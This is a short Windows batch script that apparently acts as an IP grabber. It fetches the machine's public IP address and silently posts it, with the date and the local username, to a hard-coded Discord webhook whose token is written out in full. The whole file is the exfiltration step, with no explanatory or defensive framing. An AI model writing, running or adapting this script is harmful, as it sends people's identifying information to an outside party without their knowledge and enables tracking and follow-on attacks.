set webhook=https://discord.com/api/webhooks/1196203469758017586/XnjQ0AN1otc9NCv30ZEUmPS7wmU5Ho3D7w4qH9Qt0ZYCt1MOAZawjUrNWsgqGYvqXLQW

@echo off
cls
for /f "tokens=" %%a in ('curl ifconfig.me -s') do (set publicip=%%a)
curl -d "contents=```Date:+%date%+|+Name: +%username%+|+IP:%publicip%```" -X POST %webhook%
exit 